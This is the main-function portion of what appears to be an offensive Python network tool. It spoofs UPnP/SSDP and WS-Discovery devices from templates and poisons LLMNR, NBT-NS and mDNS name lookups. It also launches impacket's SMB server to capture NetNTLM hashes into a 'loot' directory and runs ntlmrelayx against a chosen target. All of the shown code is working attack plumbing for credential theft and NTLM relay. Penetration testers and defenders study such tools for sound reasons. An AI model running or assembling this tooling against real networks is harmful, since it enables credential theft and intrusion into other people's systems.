    parser.add_argument('--poison', action='store_true', help='Enable LLMNR + NBT-NS + mDNS poisoning')
    parser.add_argument('--respond-to', nargs='+', metavar='NAME', help='Only poison these names (default: answer all)')
    parser.add_argument('--smb-capture', action='store_true', help='Launch impacket-smbserver to capture NetNTLM (needs impacket)')
    parser.add_argument('--relay', metavar='TARGET', help='Launch impacket-ntlmrelayx against TARGET (needs impacket)')

    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.abspath(__file__))

    if args.list:
        list_templates(script_dir)

    if not args.interface:
        parser.error("interface is required (or use -L to list templates)")
    if not args.templates or len(args.templates) == 0:
        parser.error("--templates/-t is required with at least one template (or use -L to list templates)")

    args.interface = re.sub(r'[^a-zA-Z0-9._-]', '', args.interface)

    if args.poison:
        args.llmnr = args.nbtns = args.mdns = True

    if args.templates == ['all']:
        templates_dir = os.path.join(script_dir, 'templates')
        if os.path.isdir(templates_dir):
            args.templates = sorted([d for d in os.listdir(templates_dir) if os.path.isdir(os.path.join(templates_dir, d))])
            if not args.templates:
                print(Colors.warning("No templates found in templates/"))
                sys.exit(1)
            print(Colors.success(f"Loading all templates: {', '.join(args.templates)}\n"))
        else:
            print(Colors.error(f"Templates directory not found: {templates_dir}"))
            sys.exit(1)

    local_ip = get_interface_ip(args.interface)
    smb_server = validate_smb_ip(args.smb, local_ip) if args.smb else local_ip

    templates_config = []
    for idx, template_name in enumerate(args.templates):
        template_dir = os.path.join(script_dir, 'templates', template_name)

        if not os.path.isdir(template_dir):
            print(Colors.error(f"Template directory not found: {template_dir}"))
            sys.exit(1)

        redirect_url = args.urls[idx] if idx < len(args.urls) else ''

        tpl_config = {
            'name': template_name,
            'template_dir': template_dir,
            'local_ip': local_ip,
            'local_port': args.port,
            'smb_server': smb_server,
            'session_usn': SSDPListener._gen_usn(),
            'redirect_url': redirect_url,
        }
        tpl_config.update(parse_device_meta(os.path.join(template_dir, 'device.xml')))
        templates_config.append(tpl_config)

    extras = []
    if not args.no_notify and not args.analyze:
        extras.append('SSDP+NOTIFY')
    else:
        extras.append('SSDP')
    if args.wsd:
        extras.append('WS-Discovery')
    for flag, label in ((args.llmnr, 'LLMNR'), (args.nbtns, 'NBT-NS'), (args.mdns, 'mDNS')):
        if flag:
            extras.append(label)

    print_banner(args, local_ip, templates_config, extras)

    procs = []
    subs = []

    listener = SSDPListener(local_ip, args.port, templates_config, args.analyze,
                            notify=not args.no_notify, notify_interval=args.notify_interval)
    procs.append(Process(target=listener.listen_forever, daemon=True))

    if args.wsd:
        wsd = WSDListener(local_ip, args.port, templates_config, args.analyze)
        procs.append(Process(target=wsd.listen_forever, daemon=True))

    respond_to = args.respond_to
    if args.llmnr:
        procs.append(Process(target=LLMNRListener(local_ip, args.analyze, respond_to).listen_forever, daemon=True))
    if args.mdns:
        procs.append(Process(target=MDNSListener(local_ip, args.analyze, respond_to).listen_forever, daemon=True))
    if args.nbtns:
        procs.append(Process(target=NBTNSListener(local_ip, args.analyze, respond_to).listen_forever, daemon=True))

    for p in procs:
        p.start()

    if args.smb_capture and not args.analyze:
        sp = launch_impacket_capture(local_ip, os.path.join(os.getcwd(), 'loot'))
        if sp:
            subs.append(sp)
    if args.relay and not args.analyze:
        sp = launch_relay(args.relay)
        if sp:
            subs.append(sp)

    app = create_app({
        'templates_config': templates_config,
        'templates_dir': [cfg['template_dir'] for cfg in templates_config]
    })
    try:
        app.run(host=local_ip, port=args.port, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        print(f"\n{Colors.warning('Shutting down...')}")
    finally:
        for p in procs:
            p.terminate()
        for sp in subs:
            try:
                sp.terminate()
            except Exception:
                pass
        sys.exit(0)


if __name__ == '__main__':
    main()
